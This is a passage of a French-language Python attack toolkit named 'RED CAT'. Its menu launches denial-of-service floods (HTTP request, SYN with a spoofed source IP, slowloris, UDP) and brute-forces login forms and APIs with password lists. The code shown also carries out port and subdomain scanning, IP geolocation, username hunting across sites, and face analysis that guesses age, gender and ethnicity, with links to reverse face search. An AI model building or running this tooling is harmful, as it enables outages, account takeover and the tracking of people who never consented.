             "https://dev.to/", "https://pinterest.com/", "https://t.me/"]
    print(f"\n  {C.BLUE}[*]{C.RESET} {len(sites)} sites...")
    found = []
    for site in sites:
        url = site + username
        try:
            resp = req.get(url, timeout=5, allow_redirects=False, headers={'User-Agent': 'Mozilla/5.0'})
            if resp.status_code == 200:
                found.append(url); print(f"  {C.GREEN}[+]{C.RESET} {url}")
            else: print(f"  {C.DIM}[-]{C.RESET} {url}")
        except Exception: print(f"  {C.DIM}[-]{C.RESET} {url}")
        time.sleep(0.3)
    if found: ok(f"{len(found)} compte(s)")
    else: warn("Aucun")

def _open_file_manager():
    try:
        if os.name == 'nt':
            os.startfile(os.path.expanduser("~"))
        elif 'com.termux' in os.environ.get('PREFIX', ''):
            os.system("termux-open /sdcard/Download/ 2>/dev/null")
        else:
            os.system("xdg-open ~ 2>/dev/null &")
    except Exception:
        pass

def _list_images():
    try:
        if os.name == 'nt':
            folder = os.path.expanduser("~/Pictures")
            if os.path.isdir(folder):
                files = [f for f in os.listdir(folder) if f.lower().endswith(('.jpg','.jpeg','.png','.gif','.bmp','.webp'))]
                for f in files[:10]:
                    print(f"  {C.DIM}{os.path.join(folder, f)}{C.RESET}")
        else:
            os.system("ls -la /sdcard/Download/ 2>/dev/null | grep -E '\\.(jpg|jpeg|png|gif|bmp|webp)' | head -10")
    except Exception:
        pass

def searchface():
    print(f"\n  {C.BLOOD}SEARCHFACE{C.RESET}")
    print("  1. Chemin manuel")
    print("  2. Ouvrir gestionnaire")
    print("  3. Lister images")
    choix = input(f"  {C.BLOOD}Choix: {C.RESET}")
    image_path = ""
    if choix == "1":
        image_path = input(f"  {C.BLOOD}Chemin: {C.RESET}").strip('"\'')
    elif choix == "2":
        _open_file_manager()
        image_path = input(f"  {C.BLOOD}Chemin: {C.RESET}").strip('"\'')
    elif choix == "3":
        _list_images()
        image_path = input(f"  {C.BLOOD}Chemin: {C.RESET}").strip('"\'')
    else:
        err("Invalide"); return
    if not image_path or not os.path.exists(image_path):
        err(f"Fichier non trouve"); return
    ok(f"Fichier: {image_path}")
    result = None
    try:
        import cv2
        from deepface import DeepFace
        blood("Analyse...")
        img = cv2.imread(image_path)
        if img is None:
            err("Image illisible"); return
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        faces = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml').detectMultiScale(gray, 1.1, 4)
        if len(faces) == 0: warn("Aucun visage")
        else:
            ok(f"{len(faces)} visage(s)")
            try:
                r = DeepFace.analyze(img_path=image_path, actions=['emotion','age','gender','race'], enforce_detection=False, silent=True)
                if isinstance(r, list): r = r[0]
                result = r
                print(f"\n  {C.GREEN}[+]{C.RESET} Age: {r.get('age', 'N/A')}")
                print(f"  {C.GREEN}[+]{C.RESET} Genre: {r.get('gender', 'N/A')}")
                print(f"  {C.GREEN}[+]{C.RESET} Ethnie: {r.get('dominant_race', 'N/A')}")
                if 'emotion' in r:
                    e = r['emotion']; d = max(e, key=e.get)
                    print(f"  {C.GREEN}[+]{C.RESET} Emotion: {d} ({e[d]:.1f}%)")
            except Exception as ex: warn(f"DeepFace: {ex}")
    except ImportError:
        warn("pip install deepface opencv-python")
    print(f"\n  {C.BLOOD}Liens:{C.RESET}")
    print(f"  {C.DIM}  https://pimeyes.com/fr/upload{C.RESET}")
    print(f"  {C.DIM}  https://tineye.com{C.RESET}")
    print(f"  {C.DIM}  https://www.google.com/imghp{C.RESET}")

def port_scanner():
    target = input(f"  {C.BLOOD}IP/domaine: {C.RESET}")
    ports = input(f"  {C.BLOOD}Ports: {C.RESET}")
    try:
        host = _extract_host(target)
        ip = gethostbyname(host)
        blood(f"Scan {host} ({ip})...")
        if '-' in ports:
            s, e = map(int, ports.split('-')); port_list = range(s, e+1)
        else: port_list = [int(p.strip()) for p in ports.split(',')]
        open_ports = []
        for port in port_list:
            try:
                sock = socket(AF_INET, SOCK_STREAM); sock.settimeout(1)
                if sock.connect_ex((ip, port)) == 0:
                    open_ports.append(port); print(f"  {C.GREEN}[+]{C.RESET} {port} ouvert")
                sock.close()
            except Exception: pass
        if open_ports: ok(f"Ouverts: {open_ports}")
        else: warn("Aucun")
    except Exception as e: err(f"Erreur: {e}")

def subdomain_finder():
    domain = _extract_host(input(f"  {C.BLOOD}Domaine: {C.RESET}"))
    wordlist = ["www","mail","ftp","webmail","smtp","pop","ns1","ns2","cpanel","autodiscover",
                "m","imap","test","ns","blog","pop3","dev","www2","admin","forum","news",
                "vpn","ns3","mail2","new","mysql","old","lists","support","mobile","mx","static"]
    blood(f"Recherche {domain}...")
    found = []
    for sub in wordlist:
        url = f"{sub}.{domain}"
        try:
            sock_lib.gethostbyname(url); found.append(url)
            print(f"  {C.GREEN}[+]{C.RESET} {url}")
        except Exception: pass
    if found: ok(f"{len(found)}")
    else: warn("Aucun")

def dns_lookup():
    target = _extract_host(input(f"  {C.BLOOD}Domaine/IP: {C.RESET}"))
    try:
        try: print(f"  {C.GREEN}[+]{C.RESET} IP: {gethostbyname(target)}")
        except Exception: pass
        try: print(f"  {C.GREEN}[+]{C.RESET} Hostname: {sock_lib.gethostbyaddr(target)[0]}")
        except Exception: pass
        for rt in ['A', 'MX', 'NS', 'TXT', 'CNAME']:
            try:
                r = subprocess.run(['nslookup', '-type=' + rt, target], capture_output=True, text=True, timeout=10)
                if r.returncode == 0:
                    print(f"  {C.GREEN}[+]{C.RESET} {rt}:")
                    for line in r.stdout.split('\n'):
                        if 'canonical name' in line.lower() or 'mail exchanger' in line.lower():
                            print(f"    {line.strip()}")
            except FileNotFoundError:
                err("nslookup non disponible"); return
            except Exception: pass
    except Exception as e: err(f"Erreur: {e}")

def whois_lookup():
    domain = _extract_host(input(f"  {C.BLOOD}Domaine: {C.RESET}"))
    try:
        r = subprocess.run(['whois', domain], capture_output=True, text=True, timeout=15)
        if r.returncode == 0:
            blood(f"Whois {domain}:")
            for line in r.stdout.split('\n')[:30]:
                if line.strip() and ':' in line: print(f"  {C.GREEN}[+]{C.RESET} {line}")
        else: err(f"Whois a echoue")
    except FileNotFoundError:
        err("whois non installe (pkg install whois / apt install whois)")
    except Exception as e: err(f"Erreur: {e}")

def password_generator():
    length = input(f"  {C.BLOOD}Longueur (16): {C.RESET}") or "16"
    count = input(f"  {C.BLOOD}Nombre (5): {C.RESET}") or "5"
    try:
        length = int(length); count = int(count)
    except ValueError:
        err("Valeurs invalides"); return
    chars = string.ascii_letters + string.digits + "!@#$%^&*()_-+=<>?"
    print(f"\n  {C.BLUE}[*]{C.RESET}")
    for i in range(count):
        print(f"  {C.GREEN}[{i+1}]{C.RESET} {''.join(choice(chars) for _ in range(length))}")

def hash_generator():
    text = input(f"  {C.BLOOD}Texte: {C.RESET}")
    print(f"\n  {C.GREEN}[+]{C.RESET} MD5: {hashlib.md5(text.encode()).hexdigest()}")
    print(f"  {C.GREEN}[+]{C.RESET} SHA1: {hashlib.sha1(text.encode()).hexdigest()}")
    print(f"  {C.GREEN}[+]{C.RESET} SHA256: {hashlib.sha256(text.encode()).hexdigest()}")

def ip_tracker():
    target = _extract_host(input(f"  {C.BLOOD}IP: {C.RESET}"))
    try:
        import requests as req
        data = req.get(f"http://ip-api.com/json/{target}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query", timeout=10).json()
        if data.get('status') == 'success':
            blood(f"Tracage {target}:")
            for k, v in data.items():
                if k != 'status': print(f"  {C.GREEN}[+]{C.RESET} {k}: {v}")
            print(f"\n  {C.YELLOW}https://maps.google.com/?q={data.get('lat')},{data.get('lon')}{C.RESET}")
        else: err("Non trouvee")
    except Exception as e: err(f"Erreur: {e}")

def mc_ip_finder():
    try: import dns.resolver
    except ImportError: err("pip install dnspython"); return
    print(f"\n  {C.BLOOD}MC IP FINDER{C.RESET}")
    print("  1. Par nom")
    print("  2. Avec port")
    choix = input(f"  {C.BLOOD}Choix: {C.RESET}")
    if choix == "1":
        serveur = _extract_host(input(f"  {C.BLOOD}Serveur: {C.RESET}"))
        try:
            ips = sock_lib.gethostbyname(serveur)
            print(f"  {C.GREEN}[+]{C.RESET} IP: {ips}")
            try:
                for srv in dns.resolver.resolve(f'_minecraft._tcp.{serveur}', 'SRV'):
                    print(f"  {C.GREEN}[+]{C.RESET} SRV: {srv.target} Port: {srv.port}")
            except Exception: pass
            try:
                s = socket(AF_INET, SOCK_STREAM); s.settimeout(3)
                if s.connect_ex((ips, 25565)) == 0: print(f"  {C.GREEN}[+]{C.RESET} 25565 OUVERT")
                else: print(f"  {C.RED}[x]{C.RESET} 25565 FERME")
                s.close()
            except Exception: pass
        except Exception as e: err(f"Erreur: {e}")
    elif choix == "2":
        serveur = _extract_host(input(f"  {C.BLOOD}Serveur: {C.RESET}"))
        port = input(f"  {C.BLOOD}Port (25565): {C.RESET}") or "25565"
        try:
            ips = sock_lib.gethostbyname(serveur)
            print(f"  {C.GREEN}[+]{C.RESET} IP: {ips}")
            s = socket(AF_INET, SOCK_STREAM); s.settimeout(3)
            if s.connect_ex((ips, int(port))) == 0: print(f"  {C.GREEN}[+]{C.RESET} {ips}:{port}")
            s.close()
        except Exception as e: err(f"Erreur: {e}")

def find_domain_ip():
    print(f"\n  {C.BLOOD}FIND DOMAIN IP{C.RESET}")
    domain = _extract_host(input(f"  {C.BLOOD}Domaine: {C.RESET}"))
    try:
        ip = gethostbyname(domain)
        ok(f"IP: {ip}")
        ports_communs = {21:"FTP",22:"SSH",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",143:"IMAP",
                         443:"HTTPS",465:"SMTPS",587:"SMTP",993:"IMAPS",995:"POP3S",
                         3306:"MySQL",3389:"RDP",5432:"PostgreSQL",8080:"HTTP-Alt"}
        open_ports = []
        for port, service in ports_communs.items():
            try:
                s = socket(AF_INET, SOCK_STREAM); s.settimeout(1)
                if s.connect_ex((ip, port)) == 0:
                    open_ports.append((port, service))
                    print(f"  {C.GREEN}[+]{C.RESET} {port} ({service})")
                s.close()
            except Exception: pass
        if open_ports:
            print(f"\n  {C.GREEN}[+]{C.RESET} {len(open_ports)} port(s)")
        try:
            import dns.resolver
            for rt in ['A', 'MX', 'NS', 'TXT']:
                try:
                    for r in dns.resolver.resolve(domain, rt): print(f"  {C.GREEN}[+]{C.RESET} {rt}: {r}")
                except Exception: pass
        except ImportError: pass
        try:
            import requests as req
            data = req.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp,org", timeout=10).json()
            print(f"\n  {C.GREEN}[+]{C.RESET} Pays: {data.get('country', 'N/A')}")
            print(f"  {C.GREEN}[+]{C.RESET} Ville: {data.get('city', 'N/A')}")
            print(f"  {C.GREEN}[+]{C.RESET} FAI: {data.get('isp', 'N/A')}")
        except Exception: pass
    except Exception as e: err(f"Erreur: {e}")

def main():
    show_banner()
    while True:
        show_menu()
        try:
            choice = input(f"\n{C.BLOOD}--[{C.RED}RED CAT{C.BLOOD}]--[{C.WHITE}Choix{C.BLOOD}]--> {C.RESET}")
        except (EOFError, KeyboardInterrupt):
            blood("\n  Le sang s'arrete...")
            sys.exit(0)
        if choice == "1":
            t = input("Target: "); th = input("Threads (1000): ") or "1000"
            run_ddos(t, 'Request', th)
        elif choice == "2":
            t = input("Target: "); th = input("Threads (1000): ") or "1000"
            sp = input("IP spoofee: ") or None
            run_ddos(t, 'Synflood', th, spoof_ip=sp)
        elif choice == "3":
            t = input("Target: "); p = input("Port (80): ") or "80"
            th = input("Threads (1000): ") or "1000"
            run_ddos(t, 'Pyslow', th, int(p))
        elif choice == "4": udp_flood()
        elif choice == "5":
            url = input("URL login: "); user = input("User: ")
            pf = input("Fichier passwords: "); em = input("Message erreur: ")
            w = input("Workers (10): ") or "10"
            asyncio.run(run_bruteforce(Config(url=url, username=user, error_message=em, password_file=pf, workers=int(w))))
        elif choice == "6":
            url = input("URL API: "); user = input("User: ")
            pf = input("Fichier passwords: "); em = input("Message erreur: ")
            w = input("Workers (10): ") or "10"
            asyncio.run(run_bruteforce(Config(url=url, username=user, error_message=em, password_file=pf,
                                              login_mode="json", api_endpoint="/login", workers=int(w))))
        elif choice == "7": shodan()
        elif choice == "8": wigle()
        elif choice == "9": numlook()
        elif choice == "10": vt()
        elif choice == "11": geolock()
        elif choice == "12": mactrace()
        elif choice == "13": exif()
        elif choice == "14": ytd()
        elif choice == "15": cryptotrace()
        elif choice == "16": sherlock()
        elif choice == "17": searchface()
        elif choice == "18": port_scanner()
        elif choice == "19": subdomain_finder()
        elif choice == "20": dns_lookup()
        elif choice == "21": whois_lookup()
        elif choice == "22": password_generator()
        elif choice == "23": hash_generator()
        elif choice == "24": ip_tracker()
        elif choice == "25": mc_ip_finder()
        elif choice == "26": find_domain_ip()
        elif choice == "99":
            blood("\n  Le sang s'arrete...")
            sys.exit(0)
        else: err("Choix invalide !")
        input(f"\n{C.DIM}Entree...{C.RESET}")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'\n{C.RED}Interrompu.{C.RESET}')
        sys.exit(0)